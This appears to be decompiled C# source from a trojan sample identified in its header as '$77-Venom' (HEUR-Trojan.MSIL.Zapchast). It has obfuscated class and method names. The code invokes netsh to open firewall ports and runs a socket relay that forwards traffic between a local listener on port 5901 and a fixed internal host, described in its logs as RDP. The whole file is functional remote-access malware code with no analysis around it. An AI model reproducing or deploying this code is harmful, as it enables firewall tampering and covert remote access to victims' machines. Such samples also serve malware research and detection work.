// Decompiled with JetBrains decompiler
// Type: 뀶Ⴏ꺴ﱕݎ괝艌奣탼ޥ烙弁퇘㗖袌沃ꀆ
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan.MSIL.Zapchast.gen-defbae45ea8e71f8a50123f382f4538afc9db836de09bab316464d4793394f19.exe

using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;

public class 뀶Ⴏ꺴ﱕݎ괝艌\uF2B2\uF305奣탼ޥ烙弁퇘㗖袌沃ꀆ\uEAFA
{
  public static void \uE18F殲뜆챑ᱽ틭䀓ﲉ\uE341㤝耮䣺\u2292뿘핿ꣷ쵺璩ꏼ鰰(
    int port,
    bool tcp,
    bool udp,
    string name)
  {
    if (tcp)
      Process.Start("netsh.exe", "firewall add  portopening TCP " + port.ToString() + name);
    if (!udp)
      return;
    Process.Start("netsh.exe", "firewall add  portopening UDP " + port.ToString() + name);
  }

  public static void Ⲁ\uEF4F㰚庾Ȳ\u283A崎\uFFFDᔭꨔ㘞ば\uE579㢟幯\u22F3\uF10C㹃叓灷()
  {
    int port1 = 5901;
    int port2 = 5901;
    int size1 = 65536;
    try
    {
      string ipString;
      using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.IP))
      {
        socket.Connect("8.8.8.8", 65530);
        ipString = (socket.LocalEndPoint as IPEndPoint).Address.ToString();
      }
      Console.WriteLine("Starting up...");
      IPEndPoint localEP = new IPEndPoint(IPAddress.Parse(ipString), port2);
      IPEndPoint remoteEP = new IPEndPoint(IPAddress.Parse("192.168.1.90"), port1);
      Socket socket1 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
      Socket socket2 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
      Console.WriteLine("Listening for connection ...");
      socket2.Bind((EndPoint) localEP);
      socket2.Listen(1);
      Socket socket3 = socket2.Accept();
      socket1.Connect((EndPoint) remoteEP);
      byte[] numArray = (byte[]) null;
      while (true)
      {
        byte[] buffer1 = new byte[size1];
        int size2 = socket3.Receive(buffer1, size1, SocketFlags.None);
        Console.WriteLine("Received {0} bytes from redir port. Sennding to RDP port.", (object) size2);
        Console.WriteLine("Sent {0} bytes to RDP. Waiting for response...", (object) socket1.Send(buffer1, size2, SocketFlags.None));
        numArray = (byte[]) null;
        byte[] buffer2 = new byte[size1];
        int size3 = socket1.Receive(buffer2, size1, SocketFlags.None);
        Console.WriteLine("Received {0} bytes from RDP. Sending to redir port", (object) size3);
        Console.WriteLine("Sent {0} bytes to redirPort.  Waiting for response...", (object) socket3.Send(buffer2, size3, SocketFlags.None));
        numArray = (byte[]) null;
      }
    }
    catch (Exception ex)
    {
      Console.WriteLine("Exception: " + ex.Message);
    }
  }
}
